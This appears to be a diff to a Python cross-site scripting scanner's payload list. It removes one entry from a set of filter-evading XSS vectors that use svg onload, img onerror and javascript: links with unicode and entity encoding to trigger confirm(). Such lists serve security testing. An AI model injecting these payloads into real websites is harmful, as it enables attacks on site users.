@@ -53,8 +53,7 @@ vectors = [
 "'\"--!><sVg/oNLoad=confirm()><\"",
 "\"><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>",
 "\"><img src=x onerror=co\u006efir\u006d`1`>",
-"\"><svg/onload=co\u006efir\u006d`1`>",
-"&lt;imG srC=# oNError=prompt()&gt;"
+"\"><svg/onload=co\u006efir\u006d`1`>"
 ]
 
 xsschecker = "d3v"      #If you want to change it, make sure the word is unlikely to appear on page
